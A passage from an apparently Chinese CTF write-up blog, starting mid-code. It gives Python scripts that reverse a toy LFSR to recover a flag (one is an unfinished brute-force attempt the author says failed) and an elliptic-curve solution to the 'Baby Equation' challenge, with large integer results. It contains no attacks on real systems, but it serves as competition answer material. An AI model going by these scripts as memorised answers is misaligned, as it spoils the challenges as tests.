class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">mask = <span class="number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class="line"><span class="comment">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">limit = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">ri = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LFSR</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">	output = (<span class="built_in">input</span> &lt;&lt; <span class="number">1</span>) &amp; limit</span><br><span class="line">	i = (<span class="built_in">input</span> &amp; mask) &amp; limit</span><br><span class="line">	a = <span class="built_in">list</span>(<span class="built_in">bin</span>(i))<span class="comment">#二进制表示1的位数是奇数</span></span><br><span class="line">	b = a.count(<span class="string">&#x27;1&#x27;</span>) % <span class="number">2</span></span><br><span class="line">	lsb = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">		lsb ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">		i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">	<span class="keyword">assert</span> lsb == b</span><br><span class="line">	<span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">	output ^= lsb</span><br><span class="line">	<span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">	<span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">	<span class="keyword">return</span> (output, lsb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">R = <span class="built_in">int</span>.from_bytes(flag[<span class="number">5</span>: -<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,R)</span><br><span class="line"><span class="comment">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,<span class="built_in">bin</span>(R))</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">208</span>):</span><br><span class="line">    (R, lsb) = LFSR(R)</span><br><span class="line">    tmp = (tmp &lt;&lt; <span class="number">1</span>) | lsb</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    if i in [204,205,206]:</span></span><br><span class="line"><span class="string">        print(i,bin(R),len(bin(R))-2)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(R)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment">#R=tmp</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#lsb只改变填充的最后一位 不改变原先的bit</span></span><br><span class="line"><span class="comment">#已知tmp是lsb 可以从第一位就开始恢复 恢复207位 然后恢复真实数据</span></span><br><span class="line">tmp = <span class="number">0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class="line">r = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">207</span>):</span><br><span class="line">    r &lt;&lt;= <span class="number">1</span></span><br><span class="line">    lsb = (tmp &gt;&gt; (<span class="number">207</span>-i))&amp;<span class="number">1</span></span><br><span class="line">    <span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">    r ^= lsb</span><br><span class="line"><span class="comment"># 这里得到的r是R207的最后207位</span></span><br><span class="line"><span class="comment"># tmp &amp; 1为R207&amp;mask 二进制中1个数的奇偶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = r</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">207</span>):</span><br><span class="line">    n |= ((<span class="built_in">list</span>(<span class="built_in">bin</span>(n &amp; mask)).count(<span class="string">&#x27;1&#x27;</span>)%<span class="number">2</span>) ^ ((tmp&gt;&gt;i) &amp; <span class="number">1</span>)) &lt;&lt; <span class="number">207</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(bin(n))</span></span><br><span class="line"></span><br><span class="line">    n &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>.to_bytes(n,<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line">m2 = <span class="built_in">int</span>.to_bytes(n + (<span class="number">1</span>&lt;&lt;<span class="number">207</span>),<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"><span class="comment">#reverse_an_LFSR_is_so_easy</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">mask = <span class="number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class="line"><span class="comment">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">limit = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">ri = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LFSR</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">        output = (<span class="built_in">input</span> &lt;&lt; <span class="number">1</span>) &amp; limit</span><br><span class="line">        i = (<span class="built_in">input</span> &amp; mask) &amp; limit</span><br><span class="line">        a = <span class="built_in">list</span>(<span class="built_in">bin</span>(i))<span class="comment">#二进制表示1的位数是奇数</span></span><br><span class="line">        b = a.count(<span class="string">&#x27;1&#x27;</span>) % <span class="number">2</span></span><br><span class="line">        lsb = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">                lsb ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">                i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> lsb == b</span><br><span class="line">        <span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">        output ^= lsb</span><br><span class="line">        <span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">        <span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">        <span class="keyword">return</span> (output, lsb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">R = <span class="built_in">int</span>.from_bytes(flag[<span class="number">5</span>: -<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,R)</span><br><span class="line"><span class="comment">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,<span class="built_in">bin</span>(R))</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>*<span class="number">208</span>):</span><br><span class="line">    (R, lsb) = LFSR(R)</span><br><span class="line">    tmp = ((tmp &lt;&lt; <span class="number">1</span>) | lsb) &amp; limit</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    if i &gt;= 2*208-6:</span></span><br><span class="line"><span class="string">        print(len(bin(tmp)),bin(tmp)[:8],bin(tmp)[-4:],list(bin(tmp &amp; mask)).count(&#x27;1&#x27;))</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(R)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(tmp)),<span class="built_in">bin</span>(tmp)[:<span class="number">8</span>])</span><br><span class="line"><span class="comment">#R=tmp</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">tmp = <span class="number">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span></span><br><span class="line"><span class="comment">#tmp = 0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class="line">valid_list = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]+=-~!@#$%^&amp;()`\\&quot;</span></span><br><span class="line">valid_list = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> valid_list]</span><br><span class="line">N = <span class="number">26</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> i:i <span class="keyword">in</span> valid_list,s))) &gt;= N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">208</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100000</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    odd = tmp &amp; <span class="number">1</span></span><br><span class="line">    tmp = tmp &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">bin</span>(tmp &amp; mask)).count(<span class="string">&#x27;1&#x27;</span>)%<span class="number">2</span> == odd:</span><br><span class="line">        <span class="comment">#print(0)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp |= <span class="number">1</span> &lt;&lt; <span class="number">207</span></span><br><span class="line">        <span class="comment">#print(1)</span></span><br><span class="line">    <span class="keyword">if</span> tmp ==<span class="number">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    m1 = <span class="built_in">int</span>.to_bytes(tmp,<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(m1):</span><br><span class="line">        <span class="built_in">print</span>(m1)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(m1))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    m2 = <span class="built_in">int</span>.to_bytes(tmp + (<span class="number">1</span>&lt;&lt;<span class="number">207</span>),<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(m2):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(m2))</span><br><span class="line">        <span class="built_in">print</span>(m2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个本来是给rsfl+做的  不过没做出来</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Baby-Equation"><a href="#Baby-Equation" class="headerlink" title="Baby Equation"></a>Baby Equation</h3><p>检索一下 可以发现这篇文章的思路说的很清楚<br><a target="_blank" rel="noopener" href="https://www.agftutoring.com/x-yz-y-xz-z-xy-4/">https://www.agftutoring.com/x-yz-y-xz-z-xy-4/</a></p>
<p>从文章中提到的论文找到准确的公式<br><a target="_blank" rel="noopener" href="http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf">http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf</a><br>然后自己手写一下脚本 根据公式算结果 加入4096bit的约束</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line">N = <span class="number">14</span></span><br><span class="line"></span><br><span class="line">a = Fraction(<span class="number">4</span>*N**<span class="number">2</span>+<span class="number">12</span>*N-<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">b = Fraction(<span class="number">32</span>*(N+<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">aa = b-Fraction(<span class="number">1</span>,<span class="number">3</span>)*a**<span class="number">2</span></span><br><span class="line">bb = Fraction(<span class="number">2</span>,<span class="number">27</span>)*a**<span class="number">3</span>-a*b/<span class="number">3</span></span><br><span class="line"><span class="comment">#print(aa,bb)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equ</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> a/(b+c)+b/(a+c)+c/(a+b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcm_3</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    lcm_ab = (a*b)//gmpy2.gcd(a,b)</span><br><span class="line">    <span class="comment">#return a*b*c</span></span><br><span class="line">    <span class="keyword">return</span> lcm_ab*c // gmpy2.gcd(lcm_ab,c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geta</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getb</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getc</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> ((-<span class="number">4</span>)*(N+<span class="number">3</span>)-(N+<span class="number">2</span>)*x)/((<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">assert</span> equ(a,b,c)== N</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span> <span class="keyword">and</span> c &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#print(a,b,c)</span></span><br><span class="line">        da,db,dc = a.denominator,b.denominator,c.denominator</span><br><span class="line">        lcm = lcm_3(da,db,dc)</span><br><span class="line">        <span class="comment">#print(lcm)</span></span><br><span class="line">        lcm = Fraction(<span class="built_in">int</span>(lcm),<span class="number">1</span>)</span><br><span class="line">        aa,bb,cc = a.numerator*lcm//a.denominator,b.numerator*lcm//b.denominator,c.numerator*lcm//c.denominator</span><br><span class="line">        <span class="keyword">if</span> log(aa,<span class="number">10</span>) &gt;<span class="number">4096</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;aa&#125;</span>\nb=<span class="subst">&#123;bb&#125;</span>\nc=<span class="subst">&#123;cc&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(equ(aa,bb,cc))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment">#print(a/(b+c)+b/(a+c)+c/(a+b),N)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ff</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">3</span> + aa*x + bb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">xp,yp,xq,yq</span>):</span><br><span class="line">    <span class="comment">#xp += a/3</span></span><br><span class="line">    <span class="comment">#xq += a/3</span></span><br><span class="line">    <span class="comment">#print(yp**2,ff(xp))</span></span><br><span class="line">    <span class="keyword">if</span> xp == xq <span class="keyword">and</span> yq == yp:</span><br><span class="line">        lm = (<span class="number">3</span>*xp**<span class="number">2</span>+aa)/(<span class="number">2</span>*yp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lm = (yp-yq)/(xp-xq)</span><br><span class="line">    xr = lm**<span class="number">2</span>-xp-xq</span><br><span class="line">    yr = lm*(xp-xr)-yp</span><br><span class="line">    <span class="comment">#print(yr**2,ff(xr),f(xr-a/3))</span></span><br><span class="line">    <span class="comment">#print(type(xr))</span></span><br><span class="line">    <span class="keyword">return</span> xr,yr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">3</span> + a*x**<span class="number">2</span>+b*x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">x,y</span>):</span><br><span class="line">    x = Fraction(<span class="built_in">int</span>(x),<span class="number">1</span>)</span><br><span class="line">    y = Fraction(<span class="built_in">int</span>(y),<span class="number">1</span>)</span><br><span class="line">    x += a/<span class="number">3</span></span><br><span class="line">    <span class="comment">#print(check(geta(x,y),getb(x,y),getc(x,y)))</span></span><br><span class="line">    xr,yr = add(x,y,x,y)</span><br><span class="line">    check(geta(xr-a/<span class="number">3</span>,yr),getb(xr-a/<span class="number">3</span>,yr),getc(xr-a/<span class="number">3</span>,yr))</span><br><span class="line">    <span class="comment">#print(xr-a/3,yr)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        xrr,yrr = add(x,y,xr,yr)</span><br><span class="line">        <span class="keyword">if</span> check(geta(xrr-a/<span class="number">3</span>,yrr),getb(xrr-a/<span class="number">3</span>,yrr),getc(xrr-a/<span class="number">3</span>,yrr)):</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment">#x,y = xr,yr</span></span><br><span class="line">        xr,yr = xrr,yrr</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">20000</span>,<span class="number">20000</span>):</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    fx = f(x)</span><br><span class="line">    <span class="keyword">if</span> fx &lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    y,flag = gmpy2.iroot(<span class="built_in">int</span>(fx),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#solve(x,y)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> solve(x,y):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">N=2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-100 260</span><br><span class="line">N=4</span><br><span class="line">a=154476802108746166441951315019919837485664325669565431700026634898253202035277999</span><br><span class="line">b=36875131794129999827197811565225474825492979968971970996283137471637224634055579</span><br><span class="line">c=4373612677928697257861252602371390152816537558161613618621437993378423467772036</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-200 680</span><br><span class="line">N=6</span><br><span class="line">a=20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557</span><br><span class="line">b=2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447</span><br><span class="line">c=1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = 10</span><br><span class="line">a=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</span><br><span class="line">b=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</span><br><span class="line">c=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = 12</span><br><span class="line">a=9771648423124723726177348367579036940996321519493182113688185913291912152167430962940286713704689291955030766917703582615167560632692208569350596318361971945750539077074921376878141735974825044184065325295542414690299404543957471585986271492883344336895444628417764598798059282135540264079530839334683089479387712689664348829803188436456581110658900633423526039703131197080466706425129542338489808063522607588342584200312382147588021744331992391832435570655076979943362024164159108464336717094994098309362464023676446199308737155163873551701208488828402974721390557367029987977855707022545910750122799634001172374761109175036019323234546383998982432217361050210984517599581577248801341849448303544088176264625811806142770294209982442408662519374761728070223714521821341117002331986498770555184073085027058095297336167677439607364510657437509486347967307803660171207058735567136463940112222314297317750700776624058908857471453427988612985064899673716630236456014245800912222319599696269373722466085725674157804399937147349826725426492477399825189629059858143754233366556058143229760327782450544023555022700607812759157576200327040510464661565706996737315846564795178593069240330781574428355212732623725876985598328229189126427627014915844367895005634186488060123351425224254658993594181034585580728472926584634345281045130880900933874051988840549119158099281094622771545146573280290125472471508524146960616613046094502775760354004277755376103461683156447272164405834240309654181339266066263159088013664792412947782580562302145769970189263032100245853943329981223091010635294626858575635181685165656502546698206083122664124915608202069269724379843842840589157695219270750118704026028654165401285548616906593019632882729540612247917655897119373938582993296569576361174642805599263009865424731023686421547614323517551093776435182182140089430393766501364362547924371223967349402455455441526984962551991999740939806598094829176294395288025415862487224690038784444479146323714873578973543339383804639812551447024169760867016277652364254017342569664821765700133711906605529500370028326735684760029880824589496327934929890451806466028722732111707352281105526352585578795270682734602251672860466286137618451728577222436372703708755203706276857915607877115578246058172188790243120058005406354006933249427269186026037719060025838643524816124535097800306551506659235785757708355416892809830706818987658005883960242994520660422766140515613930376253008301505691252247843497900812092131062228821968787255843774769294070526791658638255579065403517667805443531566516803268415382062088531458623037511041673490301151134361350520723131052983435925526212885827536368956540475248756348725668932765463359607076032536135984411047176832817954294834358117678876487728677844675188893304999714929142496108422125998795771469689592410179339895441001807800777244298595113076411858026767080234245436677391556512837521159681035996524381164562299217240816526864051747417996965408494564793876350006434149310494879345252225512207327377641046172449349234814800370542810062964918653675533999879633796275182294288725302482565574689774236243367061493493871378478841132541150327804822340923534374347417734327962641422485698737250906970866594251938717273245180046336357159717643987207108520200884860052166562771159345328326046425986193537383085182662821369601389344051970598825